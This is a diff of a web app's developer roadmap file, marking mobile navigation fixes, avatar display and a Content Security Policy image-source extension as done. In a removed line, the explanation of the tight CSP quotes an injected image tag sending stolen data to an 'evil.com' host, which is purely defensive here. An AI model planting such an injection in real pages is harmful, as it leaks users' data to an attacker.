@@ -198,7 +198,18 @@ Password section in Settings → Account: new-password + confirm-password fields
 ### 6. ~~Dice picker — random suggestion from a category~~ ✅ Done 2026-05-14
 Implemented as planned, isolated under `src/picker/` (matches `src/demo/`, `src/tmdb/`, `src/auth/`). Dice icon button sits next to the "+ Add" button on desktop; clicking pops a modal with a random item, re-roll button excludes the just-shown one so it actually changes. Empty pool disables the icon entirely; single-item pool disables re-roll. Picks from whatever the user is currently viewing (`itemsInActiveSection`) — so they can scope by navigating to Want to See / Watched / All before rolling. Mobile addition is a follow-up.
 
-### 7. Mobile view completion
+### 7. ~~Mobile view completion (major gaps closed)~~ ✅ Done 2026-06-06
+Two big mobile gaps closed this session:
+
+1. **No access to Friends / Settings / Logout / theme toggles.** The desktop sidebar has a gear icon that opens a dropdown with Light/Dark, Bookstore, Friends, Settings, Log Out. Mobile had none of these — only Add Item, the category title, and a profile avatar that opened the profile dialog. Fix: extracted the gear-menu content into a new `<UserMenu>` component (`src/components/navigation/UserMenu.tsx`); both Sidebar and MobileHeader use it. Tapping the mobile avatar now opens the same set of actions, plus a Profile item at the top so the original "tap avatar → profile" path is preserved.
+
+2. **Uploaded profile picture didn't show on mobile.** MobileHeader was hard-coded to show the user's name initial. Now renders the `profileImage` URL when set, falling back to the initial otherwise — matches the sidebar avatar's behaviour.
+
+3. **Long-press to edit notes** also landed during this session (todo N) — mobile MobileListItem now uses the shared `useLongPress` hook to open the notes editor on touch-and-hold.
+
+Out-of-scope follow-ups that could still happen:
+- More granular mobile-specific responsive tuning (the desktop sidebar also gracefully shrinks at narrow widths via the .sidebar-fluid CSS, so phones now have two valid paths: dedicated mobile chrome OR shrunken sidebar). Verify on a real phone.
+- Mobile-specific recommendation send flow (probably fine via item detail → Recommend button, since RecommendButton is rendered there).
 Earlier commit said "working on mobile view" — components exist in `src/components/mobile/` but weren't finished. Tackle when you have mobile users or before publishing.
 
 ### 6. ~~Toast/banner on Supabase failures~~ ✅ Done 2026-05-14
@@ -254,8 +265,12 @@ Bundle of things to confirm before flipping the switch:
 - Database backup strategy: enable Supabase **Database → Backups** (paid tier) OR document a manual `pg_dump` schedule
 - Confirm `npm audit` is still clean before the build
 
-### 14. Expand the CSP `img-src` whitelist when adding new poster sources
-`index.html` line 7 currently allows poster images from `'self'`, `https://image.tmdb.org`, and inline `data:` URIs only. This is intentionally tight to prevent data exfiltration via injected `<img src="https://evil.com/log?stolen=...">`. When you let users add posters from other hosts (IMDB, personal photo URLs, etc.), add those hosts to `img-src`. Any image not on the whitelist will silently fail to load.
+### 14. ~~Expand the CSP `img-src` whitelist~~ ✅ Done 2026-06-06 (incremental)
+Two extensions shipped as new image sources were added:
+- TMDB posters: `https://image.tmdb.org` (from the original baseline).
+- Supabase Storage avatars: `https://*.supabase.co` (added during todo E so uploaded profile pictures actually load).
+- `data:` inline URIs kept for the small inline error-placeholder SVG.
+Re-extend this list as new image hosts are added — silently failing images are the symptom of a missing CSP entry.
 
 ---
 
